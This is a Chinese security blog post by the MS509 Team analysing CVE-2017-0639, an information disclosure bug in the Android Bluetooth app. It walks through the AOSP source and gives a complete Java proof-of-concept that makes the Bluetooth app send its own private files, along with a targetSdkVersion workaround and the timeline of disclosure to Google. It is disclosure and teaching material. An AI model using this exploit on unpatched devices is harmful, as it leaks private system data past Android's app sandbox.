<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>蓝牙App漏洞系列分析之二 | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">蓝牙App漏洞系列分析之二</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">蓝牙App漏洞系列分析之二</h1><div class="post-meta">Jun 27, 2017<span> | </span><span class="category"><a href="/categories/原创漏洞/">原创漏洞</a><a href="/categories/原创漏洞/安卓/">安卓</a></span></div><div class="post-content"><p>作者: heeeeen</p>
<h3 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h3><p>Android本月的安全公告，修复了我们发现的另一个蓝牙App信息泄露漏洞，该漏洞允许攻击者获取 bluetooth用户所拥有的私有文件，绕过了将应用数据与其他应用隔离的操作系统防护功能。</p>
<p>漏洞信息如下：</p>
<ul>
<li>CVE: CVE-2017-0639</li>
<li>BugID: A-35310991</li>
<li>严重性: 高危</li>
<li>漏洞类型: 信息泄露</li>
<li>Updated AOSP versions: 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2<a id="more"></a>
</li>
</ul>
<h3 id="0x02-漏洞缘起"><a href="#0x02-漏洞缘起" class="headerlink" title="0x02 漏洞缘起"></a>0x02 漏洞缘起</h3><p>在发现这个漏洞之前，我浏览了Android<a href="https://source.android.com/security/bulletin/2017-02-01" target="_blank" rel="external"> 2017年2月的安全公告</a>，其中两个并排的高危信息泄露漏洞引起了我的注意：</p>
<ul>
<li>CVE-2017-0420: AOSP邮件中的信息泄露漏洞</li>
<li><p>CVE-2017-0414: AOSP短信中的信息泄露漏洞<br>查看这两个信息漏洞的补丁注释，分别为</p>
</li>
<li><p>Don’t allow file attachment from /data through GET_CONTENT</p>
</li>
<li>Thirdparty can attach private files from “/data/data/com.android.messaging/“ directory to the messaging app。<br>涵义非常清晰，似乎邮件和短信App均遗漏了对发送的文件进行验证，本地攻击者可以添加App私有目录的数据文件发送出去，从而破坏了Android沙箱所提供的应用数据相互隔离的安全防护功能。</li>
</ul>
<p>这两个漏洞可以归纳为一类<strong>针对具有对外发送或共享功能App的攻击</strong>，Android中会不会还有类似的功能具有类似的漏洞？另外，注意到上述两个漏洞的发现者并非一人，只是巧合地同时出现在2月份的安全公告之中，发现者似乎还没有意识到这类攻击的通用性，也许真的还没有搜刮干净？</p>
<h3 id="0x03-攻击面——蓝牙的信息分享"><a href="#0x03-攻击面——蓝牙的信息分享" class="headerlink" title="0x03 攻击面——蓝牙的信息分享"></a>0x03 攻击面——蓝牙的信息分享</h3><p>除了短信、邮件，很容易想到蓝牙也是Android一个很重要的信息对外发送出口。通常，我们选择一个文件的分享按钮，选择蓝牙，就可以触发蓝牙的文件发送功能，这是通过蓝牙App暴露的BluetoothOppLauncherActivity所实现。该Activity根据传入的<code>Intent.ACTION_SEND</code>或 <code>Intent.ACTION_SEND_MULTIPLE</code>，启动一个线程处理单个文件或多个文件的对外发送。主要代码如下</p>
<p><pre class="lang:java decode:true ">           /*</pre></p>
<pre><code> * Other application is trying to share a file via Bluetooth,
 * probably Pictures, videos, or vCards. The Intent should contain
 * an EXTRA_STREAM with the data to attach.
 */
if (action.equals(Intent.ACTION_SEND)) {
    // TODO: handle type == null case
    final String type = intent.getType();
    final Uri stream = (Uri)intent.getParcelableExtra(Intent.EXTRA_STREAM);
    CharSequence extra_text = intent.getCharSequenceExtra(Intent.EXTRA_TEXT);
    // If we get ACTION_SEND intent with EXTRA_STREAM, we&apos;ll use the
    // uri data;
    // If we get ACTION_SEND intent without EXTRA_STREAM, but with
    // EXTRA_TEXT, we will try send this TEXT out; Currently in
    // Browser, share one link goes to this case;
    if (stream != null &amp;amp;&amp;amp; type != null) {
        if (V) Log.v(TAG, &quot;Get ACTION_SEND intent: Uri = &quot; + stream + &quot;; mimetype = &quot;
                    + type);
        // Save type/stream, will be used when adding transfer
        // session to DB.
        Thread t = new Thread(new Runnable() {
            public void run() {
                BluetoothOppManager.getInstance(BluetoothOppLauncherActivity.this)
                    .saveSendingFileInfo(type,stream.toString(), false);
                //Done getting file info..Launch device picker and finish this activity
                    launchDevicePicker();
                    finish();
                }
            });
            t.start();
            return;
        } else {
            Log.w(TAG,&quot;Error trying to do set text...File not created!&quot;);
            finish();
            return;
        }
    } else {
        Log.e(TAG, &quot;type is null; or sending file URI is null&quot;);
        finish();
        return;
    }
} else if (action.equals(Intent.ACTION_SEND_MULTIPLE)) {
    final String mimeType = intent.getType();
    final ArrayList&amp;lt;Uri&amp;gt; uris = intent.getParcelableArrayListExtra(Intent.EXTRA_STREAM);
    if (mimeType != null &amp;amp;&amp;amp; uris != null) {
        if (V) Log.v(TAG, &quot;Get ACTION_SHARE_MULTIPLE intent: uris &quot; + uris + &quot;\n Type= &quot;
                    + mimeType);
        Thread t = new Thread(new Runnable() {
            public void run() {
                BluetoothOppManager.getInstance(BluetoothOppLauncherActivity.this)
                    .saveSendingFileInfo(mimeType,uris, false);
                //Done getting file info..Launch device picker
                //and finish this activity
                launchDevicePicker();
                finish();
            }
        });
        t.start();&lt;/pre&gt;
</code></pre><p>那么，传入蓝牙App私有数据试试！先寻找bluetooth所拥有的私有文件，</p>
<p><pre class="lang:sh decode:true ">angler:/ # find /data -user bluetooth -exec ls -al {} \; 2&gt;  /dev/null</pre><br>可以选定两个bluetooth所拥有、有实质内容的文件作为发送对象，<code>file:///data/user_de/0/com.android.bluetooth/databases/btopp.db</code>和<code>file:///data/misc/bluedroid/bt_config.conf</code></p>
<p>很快可以写出PoC</p>
<p><pre class="lang:java decode:true ">public class MainActivity extends AppCompatActivity {<br>    Button m_btnSendPriv = null;<br>    Button m_btnSendMPriv = null;<br>    private final static String PRIV_FILE_URI1 = “file:///data/user_de/0/com.android.bluetooth/databases/btopp.db”;<br>    private final static String PRIV_FILE_URI2 = “file:///data/misc/bluedroid/bt_config.conf”;</pre></p>
<pre><code>@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    m_btnSendPriv = (Button)findViewById(R.id.send_private);
    m_btnSendPriv.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View view) {
            Intent intent = new Intent(Intent.ACTION_SEND);
            intent.setType(&quot;text/plain&quot;);
            Uri uri = Uri.parse(PRIV_FILE_URI1);
            intent.putExtra(Intent.EXTRA_STREAM, uri);
            intent.setComponent(new ComponentName(&quot;com.android.bluetooth&quot;,
                 &quot;com.android.bluetooth.opp.BluetoothOppLauncherActivity&quot;));
            startActivity(intent);
        }
    });

    m_btnSendMPriv = (Button)findViewById(R.id.send_private_multiple);
    m_btnSendMPriv.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View view) {
            Intent intent = new Intent(Intent.ACTION_SEND_MULTIPLE);
            intent.setType(&quot;text/plain&quot;);
            ArrayList&amp;lt;Uri&amp;gt; uris = new ArrayList&amp;lt;Uri&amp;gt;();
            uris.add(Uri.parse(PRIV_FILE_URI1));
            uris.add(Uri.parse(PRIV_FILE_URI2));
            intent.putExtra(Intent.EXTRA_STREAM, uris);
            intent.setComponent(new ComponentName(&quot;com.android.bluetooth&quot;,
                &quot;com.android.bluetooth.opp.BluetoothOppLauncherActivity&quot;));
            startActivity(intent);

        }
    });
}
</code></pre><p>}<br><br>&nbsp;</p>
<h3 id="0x04-进一步分析"><a href="#0x04-进一步分析" class="headerlink" title="0x04 进一步分析"></a>0x04 进一步分析</h3><p>真的那么简单吗？编译PoC，运行却抛出了安全异常！</p>
<p><pre class="lang:sh decode:true ">——— beginning of crash<br>06-12 10:32:43.930 16171 16171 E AndroidRuntime: FATAL EXCEPTION: main<br>06-12 10:32:43.930 16171 16171 E AndroidRuntime: Process: ms509.com.testaospbluetoothopplauncher, PID: 16171<br>06-12 10:32:43.930 16171 16171 E AndroidRuntime: android.os.FileUriExposedException: file:///data/user_de/0/com.android.bluetooth/databases/btopp.db exposed beyond app through ClipData.Item.getUri()<br>06-12 10:32:43.930 16171 16171 E AndroidRuntime:    at android.os.StrictMode.onFileUriExposed(StrictMode.java:1799)<br>06-12 10:32:43.930 16171 16171 E AndroidRuntime:    at android.net.Uri.checkFileUriExposed(Uri.java:2346)<br>06-12 10:32:43.930 16171 16171 E AndroidRuntime:    at android.content.ClipData.prepareToLeaveProcess(ClipData.java:832)<br>06-12 10:32:43.930 16171 16171 E AndroidRuntime:    at android.content.Intent.prepareToLeaveProcess(Intent.java:8909)<br>06-12 10:32:43.930 16171 16171 E AndroidRuntime:    at android.content.Intent.prepareToLeaveProcess(Intent.java:8894)<br>06-12 10:32:43.930 16171 16171 E AndroidRuntime:    at android.app.Instrumentation.execStartActivity(Instrumentation.java:1517)<br>06-12 10:32:43.930 16171 16171 E AndroidRuntime:    at android.app.Activity.startActivityForResult(Activity.java:4224)<br>06-12 10:32:43.930 16171 16171 E AndroidRuntime:    at android.support.v4.app.BaseFragmentActivityJB.startActivityForResult(BaseFragmentActivityJB.java:50)<br>06-12 10:32:43.930 16171 16171 E AndroidRuntime:    at android.support.v4.app.FragmentActivity.startActivityForResult(FragmentActivity.java:79)<br>06-12 10:32:43.930 16171 16171 E AndroidRuntime:    at android.app.Activity.startActivityForResult(Activity.java:4183)<br></pre><br>原来触发了FileUriExposed错误，出于安全考虑，Android SDK 23以上就不能在Intent中传递file:// Uri，见<a href="https://developer.android.com/about/versions/nougat/android-7.0-changes.html?hl=zh-cn" target="_blank" rel="external">官方说明：</a></p>
<p>对于面向 Android 7.0 的应用，Android 框架执行的 StrictMode API 政策禁止在您的应用外部公开 file:// URI。如果一项包含文件 URI 的 intent 离开您的应用，则应用出现故障，并出现 FileUriExposedException 异常。要在应用间共享文件，您应发送一项 content:// URI，并授予 URI 临时访问权限。进行此授权的最简单方式是使用 FileProvider 类。</p>
<p>似乎宣判了死刑！心有不甘，继续分析BluetoothOppLauncherActivity后面的文件处理流程，调用链为saveSendingFileInfo–&gt; generateFileInfo，查看generateFileInfo函数，我们发现其实是支持传入file:// URI的。</p>
<p><pre class="lang:java decode:true ">public static BluetoothOppSendFileInfo generateFileInfo(Context context, Uri uri,<br>            String type) {<br>        ContentResolver contentResolver = context.getContentResolver();<br>        String scheme = uri.getScheme();<br>        String fileName = null;<br>        String contentType;<br>        long length = 0;<br>        // Support all Uri with “content” scheme<br>        // This will allow more 3rd party applications to share files via<br>        // bluetooth<br>        if (“content”.equals(scheme)) {<br>            contentType = contentResolver.getType(uri);<br>            Cursor metadataCursor;<br>            try {<br>                metadataCursor = contentResolver.query(uri, new String[] {<br>                        OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE<br>                }, null, null, null);<br>            } catch (SQLiteException e) {<br>                // some content providers don’t support the DISPLAY_NAME or SIZE columns<br>                metadataCursor = null;<br>            } catch (SecurityException e) {<br>                Log.e(TAG, “generateFileInfo: Permission error, could not access URI: “ + uri);<br>                return SEND_FILE_INFO_ERROR;<br>            }</pre></p>
<pre><code>    if (metadataCursor != null) {
        try {
            if (metadataCursor.moveToFirst()) {
                fileName = metadataCursor.getString(
                        metadataCursor.getColumnIndex(OpenableColumns.DISPLAY_NAME));
                length = metadataCursor.getLong(
                        metadataCursor.getColumnIndex(OpenableColumns.SIZE));
                if (D) Log.d(TAG, &quot;fileName = &quot; + fileName + &quot; length = &quot; + length);
            }
        } finally {
            metadataCursor.close();
        }
    }
    if (fileName == null) {
        // use last segment of URI if DISPLAY_NAME query fails
        fileName = uri.getLastPathSegment();
    }
} else if (&quot;file&quot;.equals(scheme)) { // Notice!!!
    fileName = uri.getLastPathSegment();
    contentType = type;
    File f = new File(uri.getPath());
    length = f.length();
} else {
    // currently don&apos;t accept other scheme
    return SEND_FILE_INFO_ERROR;
</code></pre><p><br>进一步查阅相关资料发现，原来FileUriExposed错误只是SDK引入的一项安全机制，仅仅是为了防止Intent的接收方访问发起方的私有文件。但是在我们这种攻击场景下，我们是要Intent的接收方BluetoothOppLauncherActivity访问其自己的私有文件，而且查看上述代码，既有对file:// URI的支持，也缺乏对文件是否属于私有目录的验证，Why not?</p>
<p>既然是SDK 23以后引入的安全机制，那么我们把build.gradle中的targetSdkVersion从原先的25改为23，重新编译运行，就可以将Bluetooth App的私有文件通过蓝牙发送出去，而这些文件原本连用户均无法获取，这就打破了Android沙箱的应用间数据隔离机制。至此，大功告成！</p>
<h3 id=""><a href="#" class="headerlink" title=""></a><img src="http://www.ms509.com/wp-content/uploads/2017/06/share_success.png" alt="share_success"></h3><h3 id="0x05-时间线"><a href="#0x05-时间线" class="headerlink" title="0x05 时间线"></a>0x05 时间线</h3><ul>
<li>2017.02.13: 提交Google</li>
<li>2017.03.01: 漏洞确认，初始评级为高</li>
<li>2017.06.05: 补丁发布</li>
<li>2017.06.12: 漏洞公开</li>
</ul>
</div><div class="tags"></div><div class="post-nav"><a href="/2017/07/14/684/" class="pre">CVE-2016-10277在MOTO X手机上的漏洞利用实践</a><a href="/2017/06/23/Bluetooth-Vul-3/" class="next">蓝牙App漏洞系列分析之三</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/IOS/">IOS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/渗透测试/">渗透测试</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/原创漏洞/">原创漏洞</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/安卓/">安卓</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/">原创漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/安卓/">安卓</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安卓/">安卓</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/未分类/">未分类</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/android-drozer/" style="font-size: 15px;">android drozer</a> <a href="/tags/Cknife-Disclaimer/" style="font-size: 15px;">Cknife Disclaimer</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/08/04/github-e4-bf-a1-e6-81-af-e6-b3-84-e9-9c-b2-e5-8d-87-e7-ba-a7-e7-89-88-e6-a1-88-e4-be-8b/">Github信息泄露升级版案例</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/14/684/">CVE-2016-10277在MOTO X手机上的漏洞利用实践</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/27/e8-93-9d-e7-89-99app-e6-bc-8f-e6-b4-9e-e7-b3-bb-e5-88-97-e5-88-86-e6-9e-90-e4-b9-8b-e4-ba-8ccve-2017-0639/">蓝牙App漏洞系列分析之二</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/23/Bluetooth-Vul-3/">蓝牙App漏洞系列分析之三</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/14/e5-90-8c-e5-bd-a2-e5-bc-82-e4-b9-89-e5-ad-97-e9-92-93-e9-b1-bc-e6-94-bb-e5-87-bb-ef-bc-8c-e9-92-89-e9-92-89-e4-b8-ad-e6-8b-9b/">“同形异义字”钓鱼攻击，钉钉中招</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/12/Bluetooth-Vul-2/">蓝牙App漏洞系列分析之二</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/06/e5-88-86-e4-ba-ab-e4-b8-80-e7-a7-8d-e5-8f-af-e5-85-b3-e9-97-ad-e5-a4-a7-e5-a4-9a-e6-95-b0-e6-9d-80-e8-bd-af-e7-9a-84-e6-8a-80-e6-9c-af-ef-bc-88-e5-af-b9360-e5-ae-89-e5-85-a8-e5-8d-ab-e5-a3-ab/">分享一种可关闭大多数杀软的技术（对360安全卫士已验证成功）</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/15/e8-93-9d-e7-89-99app-e6-bc-8f-e6-b4-9e-e7-b3-bb-e5-88-97-e5-88-86-e6-9e-90-e4-b9-8b-e4-b8-80/">蓝牙App漏洞系列分析之一</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/14/e9-a6-96-e5-8f-91-wannacry-e5-8b-92-e7-b4-a2-e8-bd-af-e4-bb-b6-e6-af-8d-e4-bd-93-e4-b8-bb-e7-a8-8b-e5-ba-8f-e9-80-86-e5-90-91-e5-88-86-e6-9e-90-ef-bc-88-e5-90-ab-e4-b8-b4-e6-97-b6-e8-a7-a3-e5-86-b3/">首发 | Wannacry勒索软件母体主程序逆向分析（含临时解决方案自动化工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/04/Bluetoooth_Vul_1/">蓝牙App漏洞系列分析之一</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2017 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>